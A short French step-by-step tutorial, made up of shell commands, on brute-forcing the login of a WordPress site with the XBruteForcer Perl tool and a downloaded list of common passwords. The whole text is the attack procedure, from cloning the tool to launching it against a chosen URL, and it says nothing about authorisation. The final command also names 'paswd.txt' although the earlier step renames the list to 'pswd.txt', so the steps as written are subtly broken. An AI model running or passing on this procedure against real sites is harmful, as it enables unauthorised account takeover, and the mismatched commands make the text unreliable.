## 1. Clonage du dépôt github de XBruteForcer

```bash
git clone https://github.com/Moham3dRiahi/XBruteForcer.git
```

## 2. Se rendre dans le dossier cloné

```bash
cd XBruteForcer
```

## 3. Ajouter l'url du site Wordpress à brute forcer

```bash
echo "[WEBSITE_URL]" > list.txt
```

## 4. Cloner un ficher contenant 10 millions de mots de passe

```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
```

## 5. Renommer le fichier cloné

```bash
mv 10-million-password-list-top-1000000.txt pswd.txt
```

## 6. Lancer l'attaque

```bash
perl XBruteForcer.pl -l list.txt -p paswd.txt
```
